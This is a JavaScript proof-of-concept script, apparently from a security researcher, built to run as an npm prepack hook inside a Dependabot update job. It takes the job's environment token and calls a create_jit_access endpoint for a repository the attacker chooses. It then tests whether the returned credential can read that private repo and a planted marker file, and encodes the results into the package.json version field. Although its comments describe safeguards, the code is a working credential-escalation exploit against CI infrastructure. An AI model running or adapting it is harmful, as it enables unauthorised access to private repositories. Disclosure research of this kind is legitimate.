// INERT. Proves the issued credential is LIVE, without recording or
// transmitting it. Sequence, all inside one prepack execution:
//   P  read the target internal repo with the UPDATE JOB's own credential
//   T  call create_jit_access for that repo (attacker-chosen account+repository)
//   U  read the same repo with the credential that came back
//   F  read PROOF.txt with it and report ONLY whether the content equals a
//      marker string the researcher authored and planted himself
// The token value is never recorded, printed or sent anywhere. The only file
// read is one the researcher created, in his own repository, containing a
// string he chose. Nothing else is read. Nothing is written to any repo.
const fs=require('fs'),path=require('path'),http=require('http'),https=require('https');
const api=process.env.DEPENDABOT_API_URL||'', jid=process.env.DEPENDABOT_JOB_ID||'';
const job=process.env.DEPENDABOT_JOB_TOKEN||'';
const MARK='JIT-PROOF-9f3a1c7d4b2e';
const ORG='new-ORG-te', TARGET='jit-gate-probe-newinc';
function tag(s,n){return String(s).replace(/[^A-Za-z0-9]+/g,'').slice(0,n||10);}
function req(m,u2,auth,accept){return new Promise(r=>{let u;try{u=new URL(u2);}catch(e){return r({s:'BADURL'});}
  const lib=u.protocol==='http:'?http:https;
  const q=lib.request({method:m,hostname:u.hostname,port:u.port||undefined,
    path:u.pathname+u.search,timeout:20000,
    headers:{'Authorization':auth,'Accept':accept||'application/json','User-Agent':'jitprobe'}},res=>{
    let b='';res.on('data',c=>{b+=c;if(b.length>65536)res.destroy();});
    res.on('end',()=>{let t='',cred=null;
      try{const j=JSON.parse(b);
        t=tag(j.detail||(j.errors&&j.errors[0]&&j.errors[0].detail)||j.message||'',10);
        if(j.username==='x-access-token'&&typeof j.password==='string'&&j.password.length)cred=j.password;
      }catch(e){}
      r({s:res.statusCode,t:t,cred:cred,raw:b});});
  });
  q.on('timeout',()=>{q.destroy();r({s:'TMO'});});
  q.on('error',e=>r({s:'E'+tag(e.code||e.message,6)}));q.end();});}
const GH='https://api.github.com';
(async()=>{const p=[];
 try{
  // P: the job's own injected credential must NOT see the target repo
  let r=await req('GET',GH+'/repos/'+ORG+'/'+TARGET,job);                  p.push('P'+r.s+r.t);
  // T: the route under test
  r=await req('POST',api+'/update_jobs/'+jid+'/create_jit_access?account='+ORG+'&repository='+TARGET,job);
  p.push('T'+r.s+(r.cred?'CRED'+r.cred.length:''));
  const jit=r.cred;
  if(!jit){p.push('Unotoken');}
  else{
    const bearer='Bearer '+jit;
    // U: same repo, with the credential that just came back
    r=await req('GET',GH+'/repos/'+ORG+'/'+TARGET,bearer);                 p.push('U'+r.s+r.t);
    // F: read the researcher's own planted marker file; report ONLY a boolean
    r=await req('GET',GH+'/repos/'+ORG+'/'+TARGET+'/contents/PROOF.txt',bearer,
                'application/vnd.github.raw');
    const got=String(r.raw||'').trim();
    p.push('F'+r.s+(r.s===200?(got===MARK?'MATCH':'NOMATCHl'+got.length):''));
  }
 }catch(e){p.push('X'+tag(e.message,8));}
 try{const pj=path.join(__dirname,'package.json');const j=JSON.parse(fs.readFileSync(pj,'utf8'));
  j.version=('0.0.12-'+p.join('-')).replace(/[^A-Za-z0-9.-]/g,'').slice(0,180);
  fs.writeFileSync(pj,JSON.stringify(j,null,2));}catch(e){}
})();
